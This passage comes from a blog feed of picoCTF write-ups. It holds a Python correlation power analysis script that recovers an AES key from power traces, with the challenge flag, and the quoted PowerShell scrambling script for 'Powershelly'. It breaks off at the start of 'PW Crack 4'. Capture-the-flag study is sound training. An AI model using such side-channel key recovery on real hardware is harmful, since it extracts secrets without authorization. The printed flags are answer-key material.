&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xCD&lt;/span>, &lt;span style="color:#ae81ff">0x0C&lt;/span>, &lt;span style="color:#ae81ff">0x13&lt;/span>, &lt;span style="color:#ae81ff">0xEC&lt;/span>, &lt;span style="color:#ae81ff">0x5F&lt;/span>, &lt;span style="color:#ae81ff">0x97&lt;/span>, &lt;span style="color:#ae81ff">0x44&lt;/span>, &lt;span style="color:#ae81ff">0x17&lt;/span>, &lt;span style="color:#ae81ff">0xC4&lt;/span>, &lt;span style="color:#ae81ff">0xA7&lt;/span>, &lt;span style="color:#ae81ff">0x7E&lt;/span>, &lt;span style="color:#ae81ff">0x3D&lt;/span>, &lt;span style="color:#ae81ff">0x64&lt;/span>, &lt;span style="color:#ae81ff">0x5D&lt;/span>, &lt;span style="color:#ae81ff">0x19&lt;/span>, &lt;span style="color:#ae81ff">0x73&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x60&lt;/span>, &lt;span style="color:#ae81ff">0x81&lt;/span>, &lt;span style="color:#ae81ff">0x4F&lt;/span>, &lt;span style="color:#ae81ff">0xDC&lt;/span>, &lt;span style="color:#ae81ff">0x22&lt;/span>, &lt;span style="color:#ae81ff">0x2A&lt;/span>, &lt;span style="color:#ae81ff">0x90&lt;/span>, &lt;span style="color:#ae81ff">0x88&lt;/span>, &lt;span style="color:#ae81ff">0x46&lt;/span>, &lt;span style="color:#ae81ff">0xEE&lt;/span>, &lt;span style="color:#ae81ff">0xB8&lt;/span>, &lt;span style="color:#ae81ff">0x14&lt;/span>, &lt;span style="color:#ae81ff">0xDE&lt;/span>, &lt;span style="color:#ae81ff">0x5E&lt;/span>, &lt;span style="color:#ae81ff">0x0B&lt;/span>, &lt;span style="color:#ae81ff">0xDB&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xE0&lt;/span>, &lt;span style="color:#ae81ff">0x32&lt;/span>, &lt;span style="color:#ae81ff">0x3A&lt;/span>, &lt;span style="color:#ae81ff">0x0A&lt;/span>, &lt;span style="color:#ae81ff">0x49&lt;/span>, &lt;span style="color:#ae81ff">0x06&lt;/span>, &lt;span style="color:#ae81ff">0x24&lt;/span>, &lt;span style="color:#ae81ff">0x5C&lt;/span>, &lt;span style="color:#ae81ff">0xC2&lt;/span>, &lt;span style="color:#ae81ff">0xD3&lt;/span>, &lt;span style="color:#ae81ff">0xAC&lt;/span>, &lt;span style="color:#ae81ff">0x62&lt;/span>, &lt;span style="color:#ae81ff">0x91&lt;/span>, &lt;span style="color:#ae81ff">0x95&lt;/span>, &lt;span style="color:#ae81ff">0xE4&lt;/span>, &lt;span style="color:#ae81ff">0x79&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xE7&lt;/span>, &lt;span style="color:#ae81ff">0xC8&lt;/span>, &lt;span style="color:#ae81ff">0x37&lt;/span>, &lt;span style="color:#ae81ff">0x6D&lt;/span>, &lt;span style="color:#ae81ff">0x8D&lt;/span>, &lt;span style="color:#ae81ff">0xD5&lt;/span>, &lt;span style="color:#ae81ff">0x4E&lt;/span>, &lt;span style="color:#ae81ff">0xA9&lt;/span>, &lt;span style="color:#ae81ff">0x6C&lt;/span>, &lt;span style="color:#ae81ff">0x56&lt;/span>, &lt;span style="color:#ae81ff">0xF4&lt;/span>, &lt;span style="color:#ae81ff">0xEA&lt;/span>, &lt;span style="color:#ae81ff">0x65&lt;/span>, &lt;span style="color:#ae81ff">0x7A&lt;/span>, &lt;span style="color:#ae81ff">0xAE&lt;/span>, &lt;span style="color:#ae81ff">0x08&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xBA&lt;/span>, &lt;span style="color:#ae81ff">0x78&lt;/span>, &lt;span style="color:#ae81ff">0x25&lt;/span>, &lt;span style="color:#ae81ff">0x2E&lt;/span>, &lt;span style="color:#ae81ff">0x1C&lt;/span>, &lt;span style="color:#ae81ff">0xA6&lt;/span>, &lt;span style="color:#ae81ff">0xB4&lt;/span>, &lt;span style="color:#ae81ff">0xC6&lt;/span>, &lt;span style="color:#ae81ff">0xE8&lt;/span>, &lt;span style="color:#ae81ff">0xDD&lt;/span>, &lt;span style="color:#ae81ff">0x74&lt;/span>, &lt;span style="color:#ae81ff">0x1F&lt;/span>, &lt;span style="color:#ae81ff">0x4B&lt;/span>, &lt;span style="color:#ae81ff">0xBD&lt;/span>, &lt;span style="color:#ae81ff">0x8B&lt;/span>, &lt;span style="color:#ae81ff">0x8A&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x70&lt;/span>, &lt;span style="color:#ae81ff">0x3E&lt;/span>, &lt;span style="color:#ae81ff">0xB5&lt;/span>, &lt;span style="color:#ae81ff">0x66&lt;/span>, &lt;span style="color:#ae81ff">0x48&lt;/span>, &lt;span style="color:#ae81ff">0x03&lt;/span>, &lt;span style="color:#ae81ff">0xF6&lt;/span>, &lt;span style="color:#ae81ff">0x0E&lt;/span>, &lt;span style="color:#ae81ff">0x61&lt;/span>, &lt;span style="color:#ae81ff">0x35&lt;/span>, &lt;span style="color:#ae81ff">0x57&lt;/span>, &lt;span style="color:#ae81ff">0xB9&lt;/span>, &lt;span style="color:#ae81ff">0x86&lt;/span>, &lt;span style="color:#ae81ff">0xC1&lt;/span>, &lt;span style="color:#ae81ff">0x1D&lt;/span>, &lt;span style="color:#ae81ff">0x9E&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xE1&lt;/span>, &lt;span style="color:#ae81ff">0xF8&lt;/span>, &lt;span style="color:#ae81ff">0x98&lt;/span>, &lt;span style="color:#ae81ff">0x11&lt;/span>, &lt;span style="color:#ae81ff">0x69&lt;/span>, &lt;span style="color:#ae81ff">0xD9&lt;/span>, &lt;span style="color:#ae81ff">0x8E&lt;/span>, &lt;span style="color:#ae81ff">0x94&lt;/span>, &lt;span style="color:#ae81ff">0x9B&lt;/span>, &lt;span style="color:#ae81ff">0x1E&lt;/span>, &lt;span style="color:#ae81ff">0x87&lt;/span>, &lt;span style="color:#ae81ff">0xE9&lt;/span>, &lt;span style="color:#ae81ff">0xCE&lt;/span>, &lt;span style="color:#ae81ff">0x55&lt;/span>, &lt;span style="color:#ae81ff">0x28&lt;/span>, &lt;span style="color:#ae81ff">0xDF&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x8C&lt;/span>, &lt;span style="color:#ae81ff">0xA1&lt;/span>, &lt;span style="color:#ae81ff">0x89&lt;/span>, &lt;span style="color:#ae81ff">0x0D&lt;/span>, &lt;span style="color:#ae81ff">0xBF&lt;/span>, &lt;span style="color:#ae81ff">0xE6&lt;/span>, &lt;span style="color:#ae81ff">0x42&lt;/span>, &lt;span style="color:#ae81ff">0x68&lt;/span>, &lt;span style="color:#ae81ff">0x41&lt;/span>, &lt;span style="color:#ae81ff">0x99&lt;/span>, &lt;span style="color:#ae81ff">0x2D&lt;/span>, &lt;span style="color:#ae81ff">0x0F&lt;/span>, &lt;span style="color:#ae81ff">0xB0&lt;/span>, &lt;span style="color:#ae81ff">0x54&lt;/span>, &lt;span style="color:#ae81ff">0xBB&lt;/span>, &lt;span style="color:#ae81ff">0x16&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">data_preprocess&lt;/span>(json_data):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ct_col = []&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> trace_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> bytes &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">16&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_pt_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tmp_ct_col = []&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace_idx &lt;span style="color:#f92672">in&lt;/span> range(len(json_data)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_pt_col&lt;span style="color:#f92672">.&lt;/span>append(json_data[trace_idx][&lt;span style="color:#e6db74">&amp;#39;pt&amp;#39;&lt;/span>][bytes])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tmp_ct_col.append(json_data[trace_idx][&amp;#39;ct&amp;#39;][bytes])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt_col&lt;span style="color:#f92672">.&lt;/span>append(tmp_pt_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># ct_col.append(tmp_ct_col)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> point &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">300&lt;/span>, &lt;span style="color:#ae81ff">400&lt;/span>):&lt;span style="color:#75715e">#len(json_data[0][&amp;#39;pm&amp;#39;])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_trace_col &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace_idx &lt;span style="color:#f92672">in&lt;/span> range(len(json_data)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_trace_col&lt;span style="color:#f92672">.&lt;/span>append(json_data[trace_idx][&lt;span style="color:#e6db74">&amp;#39;pm&amp;#39;&lt;/span>][point])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> trace_col&lt;span style="color:#f92672">.&lt;/span>append(tmp_trace_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> pt_col, trace_col
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">sbox_preprocess&lt;/span>(pt_col):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result_tmp &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> sbox_key &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">256&lt;/span>): &lt;span style="color:#75715e"># 總共有256個sbox key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace &lt;span style="color:#f92672">in&lt;/span> range(len(pt_col)): &lt;span style="color:#75715e"># 有50個trace&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp&lt;span style="color:#f92672">.&lt;/span>append(pt_col[trace] &lt;span style="color:#f92672">^&lt;/span> sbox_key)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result_tmp&lt;span style="color:#f92672">.&lt;/span>append(tmp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> sbox_result_tmp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">choose_sbox&lt;/span>(sbox_result_tmp):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result &lt;span style="color:#f92672">=&lt;/span> copy&lt;span style="color:#f92672">.&lt;/span>deepcopy(sbox_result_tmp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> sbox_key &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">256&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> trace &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">50&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hex_value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{0:0&amp;gt;2x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(sbox_result_tmp[sbox_key][trace])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x, y &lt;span style="color:#f92672">=&lt;/span> hex_value[&lt;span style="color:#ae81ff">0&lt;/span>], hex_value[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_result[sbox_key][trace] &lt;span style="color:#f92672">=&lt;/span> s_box[int(x, &lt;span style="color:#ae81ff">16&lt;/span>)][int(y, &lt;span style="color:#ae81ff">16&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> sbox_result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">cal_hamming_weight&lt;/span>(sbox_result_col):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hw_model &lt;span style="color:#f92672">=&lt;/span> copy&lt;span style="color:#f92672">.&lt;/span>deepcopy(sbox_result_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(sbox_result_col)): &lt;span style="color:#75715e"># 256&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(len(sbox_result_col[i])): &lt;span style="color:#75715e"># 50&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hw_model[i][j] &lt;span style="color:#f92672">=&lt;/span> bin(sbox_result_col[i][j])&lt;span style="color:#f92672">.&lt;/span>count(&lt;span style="color:#e6db74">&amp;#39;1&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> hw_model
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">cal_correlation&lt;/span>(hw_model_col_result, trace_col):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation_result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> trange(len(hw_model_col_result)):&lt;span style="color:#75715e">#(ascii_letters + digits).encode():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(biggest_length):&lt;span style="color:#75715e">#len(trace_col)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># correlation_result.append(pearsonr(hw_model_col_result[i], trace_col[j])[0])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation_result&lt;span style="color:#f92672">.&lt;/span>append(run_pearson_correlation(hw_model_col_result[i], trace_col[j]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> correlation_result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run_pearson_correlation&lt;/span>(x, y):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mean_x &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>mean(x)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mean_y &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>mean(y)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> covariance &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sum((x &lt;span style="color:#f92672">-&lt;/span> mean_x) &lt;span style="color:#f92672">*&lt;/span> (y &lt;span style="color:#f92672">-&lt;/span> mean_y))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> std_dev_x &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sqrt(np&lt;span style="color:#f92672">.&lt;/span>sum((x &lt;span style="color:#f92672">-&lt;/span> mean_x)&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> std_dev_y &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sqrt(np&lt;span style="color:#f92672">.&lt;/span>sum((y &lt;span style="color:#f92672">-&lt;/span> mean_y)&lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation &lt;span style="color:#f92672">=&lt;/span> covariance &lt;span style="color:#f92672">/&lt;/span> (std_dev_x &lt;span style="color:#f92672">*&lt;/span> std_dev_y)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> correlation
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">display_pt&lt;/span>(offset:int, data_offset &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">0&lt;/span>, len(j[&lt;span style="color:#ae81ff">0&lt;/span>][&lt;span style="color:#e6db74">&amp;#34;pm&amp;#34;&lt;/span>]))):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plt&lt;span style="color:#f92672">.&lt;/span>plot(range(data_offset[&lt;span style="color:#ae81ff">0&lt;/span>], data_offset[&lt;span style="color:#ae81ff">1&lt;/span>]), j[offset][&lt;span style="color:#e6db74">&amp;#34;pm&amp;#34;&lt;/span>][data_offset[&lt;span style="color:#ae81ff">0&lt;/span>]:data_offset[&lt;span style="color:#ae81ff">1&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plt&lt;span style="color:#f92672">.&lt;/span>savefig(fname&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;./PicoCTF/Crypto/PowerAnalysis- Part 1/pt_&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(offset) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;.jpg&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plt&lt;span style="color:#f92672">.&lt;/span>clf()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># display_pt(1, (0, 700))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># display_pt(1)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt_col, trace_col &lt;span style="color:#f92672">=&lt;/span> data_preprocess(j)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>biggest_length &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#75715e">#len(trace_col)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> idx &lt;span style="color:#f92672">in&lt;/span> trange(&lt;span style="color:#ae81ff">16&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sbox_preprocess_result &lt;span style="color:#f92672">=&lt;/span> sbox_preprocess(pt_col[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choose_sbox_result &lt;span style="color:#f92672">=&lt;/span> choose_sbox(sbox_preprocess_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hw_model_col_result &lt;span style="color:#f92672">=&lt;/span> cal_hamming_weight(choose_sbox_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> correlation_result &lt;span style="color:#f92672">=&lt;/span> cal_correlation(hw_model_col_result, trace_col)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> key_idx &lt;span style="color:#f92672">=&lt;/span> correlation_result&lt;span style="color:#f92672">.&lt;/span>index(max(correlation_result))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># flag += (ascii_letters + digits)[key_idx // biggest_length]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> long_to_bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#f92672">+=&lt;/span> long_to_bytes(key_idx &lt;span style="color:#f92672">//&lt;/span> biggest_length)&lt;span style="color:#f92672">.&lt;/span>hex()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;The key of AES is: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> flag )
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>picoCTF{4999139026d84bf20427eb48d4edec53}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Powershelly</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---powershelly/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---powershelly/</guid><description>&lt;h1 id="picoctf---powershelly">
 PicoCTF - Powershelly
 &lt;a class="anchor" href="#picoctf---powershelly">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zh.wikipedia.org/zh-tw/PowerShell#%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E5%AD%97%E5%85%83%E6%AF%94%E8%BE%83">Powershell 命令提示字元比較&lt;/a>
&lt;a href="https://stackoverflow.com/questions/56965510/what-is-meaning-in-powershell">What is &amp;lsquo;@{}&amp;rsquo; meaning in PowerShell&lt;/a>
&lt;a href="https://stackoverflow.com/questions/28732025/what-does-mean-in-powershell">What does @() mean in Powershell?&lt;/a>
&lt;a href="https://wenyuangg.github.io/posts/python3/python-set.html">[Python] 學習使用集合 (Set)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash=" data-lang="bash=">$input = &amp;#34;.\input.txt&amp;#34;

$out = Get-Content -Path $input
$enc = [System.IO.File]::ReadAllBytes(&amp;#34;$input&amp;#34;)
$encoding = [system.Text.Encoding]::UTF8
$total = 264
$t = ($total + 1) * 5 #1325
$numLength = ($total * 30 ) + $t # 9245
if ($out.Length -gt 5 -or $enc.count -ne $numLength)
{
 Write-Output &amp;#34;Wrong format 5&amp;#34;
 Exit
}

else
{
 for($i=0; $i -lt $enc.count ; $i++)
 {
 if (($enc[$i] -ne 49) -and ($enc[$i] -ne 48) -and ($enc[$i] -ne 10) -and ($enc[$i] -ne 13) -and ($enc[$i] -ne 32))
 {
 Write-Output &amp;#34;Wrong format 1/0/&amp;#34;
 Exit
 }
 }
}

$blocks = @{}
for ($i=0; $i -lt $out.Length ; $i++)
{
 $r = $out[$i].Split(&amp;#34; &amp;#34;)
 if ($i -gt 0)
 {
 for ($j=0; $j -lt $r.Length ; $j++)
 {
 if ($r[$j].Length -ne 6)
 {
 Write-Output &amp;#34;Wrong Format 6&amp;#34; $r[$j].Length
 Exit
 }
 $blocks[$j] += $r[$j]
 }
 }
 else
 {
 for ($j=0; $j -lt $r.Length ; $j++)
 {
 if ($r[$j].Length -ne 6)
 {
 Write-Output &amp;#34;Wrong Format 6&amp;#34; $r[$j].Length
 Exit
 }
 $blocks[$j] = @()
 $blocks[$j] += $r[$j]
 }
 }

}


function Exit {
 exit
}


function Random-Gen {
 $list1 = @()
 for ($i=1; $i -lt ($blocks.count + 1); $i++)
 {
 $y = ((($i * 327) % 681 ) + 344) % 313
 $list1 += $y
 }
 return $list1
}


function Scramble {
 param (
 $block,
 $seed
 )
 $raw = [system.String]::Join(&amp;#34;&amp;#34;, $block)
 $bm = &amp;#34;10 &amp;#34; * $raw.Length
 $bm = $bm.Split(&amp;#34; &amp;#34;)
 for ($i=0; $i -lt $raw.Length ; $i++)
 {

 $y = ($i * $seed) % $raw.Length
 $n = $bm[$y]
 while ($n -ne &amp;#34;10&amp;#34;)
 {
 $y = ($y + 1) % $raw.Length
 $n = $bm[$y]
 }
 if ($raw[$i] -eq &amp;#34;1&amp;#34; )
 {
 $n = &amp;#34;11&amp;#34;
 }
 else
 {
 $n = &amp;#34;00&amp;#34;
 }
 $bm[$y] = $n
 }
 $raw2 = [system.String]::Join(&amp;#34;&amp;#34;, $bm)
 $b = [convert]::ToInt64($raw2,2)
 return $b
}


$result = 0
$seeds = @()
for ($i=1; $i -lt ($blocks.count +1); $i++)
{
 $seeds += ($i * 127) % 500
}

$randoms = Random-Gen
$output_file = @()
for ($i=0; $i -lt $blocks.count ; $i++)
{

 $fun = Scramble -block $blocks[$i] -seed $seeds[$i]
 if($i -eq 263)
 {
 Write-Output $seeds[$i]
 Write-Output $randoms[$i]
 Write-Output $fun
 }
 $result = $fun -bxor $result -bxor $randoms[$i]
 $output_file += $result
}
Add-Content -Path output_test.txt -Value $output_file
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - PW Crack 4</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---pw-crack-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/general-skills/picoctf---pw-crack-4/</guid><description>&lt;h1 id="picoctf---pw-crack-4">
 PicoCTF - PW Crack 4
 &lt;a class="anchor" href="#picoctf---pw-crack-4">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-general-skills">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>General Skills&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-general-skills">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/248?category=5&amp;amp;page=2">PW Crack 4&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
